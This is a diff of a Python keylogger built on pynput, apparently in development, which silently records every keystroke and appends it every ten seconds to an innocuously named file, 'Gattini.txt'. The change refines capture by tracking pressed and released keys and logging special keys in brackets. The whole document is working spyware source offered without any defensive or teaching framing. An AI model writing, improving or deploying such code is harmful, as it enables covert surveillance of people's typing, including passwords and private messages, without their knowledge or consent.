@@ -2,32 +2,26 @@ from pynput import keyboard
 import threading
 
 
-gattini_file = "Gattini.txt"
-
+gattini_file = "Gattini.txt"  
 
 text = ""
 previous_text = ""
 
+time_interval = 10  
 
-time_interval = 10
+pressed_keys = set()
 
 
 def save_to_file():
     global text, previous_text
     try:
         if text:  
-            
-            if text != previous_text:
+            if text != previous_text:  
                 
-                if text.isalpha():
-                    text_to_save = text + "-"
-                else:
-                    text_to_save = text
-               
                 with open(gattini_file, "a") as f:
-                    f.write(text_to_save + "\n")  
+                    f.write(text + "\n")  
                 
-                previous_text = text
+                previous_text = text  
         
         timer = threading.Timer(time_interval, save_to_file)
         timer.start()
@@ -36,9 +30,12 @@ def save_to_file():
 
 
 def on_press(key):
-    global text
+    global text, pressed_keys
     try:
-       
+        if key in pressed_keys:
+            return  
+        pressed_keys.add(key)  
+
         if key == keyboard.Key.enter:
             text += "\n"
         elif key == keyboard.Key.tab:
@@ -48,17 +45,26 @@ def on_press(key):
         elif key == keyboard.Key.backspace:
             if len(text) > 0:
                 text = text[:-1]
-        else:
-       
+        elif hasattr(key, 'char') and key.char:
             text += key.char
-    except AttributeError:
+        else:
+            text += f"[{key}]"
 
+    except AttributeError:
+        
         text += f"[{key}]"
 
 
-with keyboard.Listener(on_press=on_press) as listener:
+def on_release(key):
+    global pressed_keys
+    try:
+        
+        if key in pressed_keys:
+            pressed_keys.remove(key)
+    except Exception as e:
+        print(f"Errore durante il rilascio del tasto: {e}")
 
-    save_to_file()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    save_to_file()  
     listener.join()
-
-
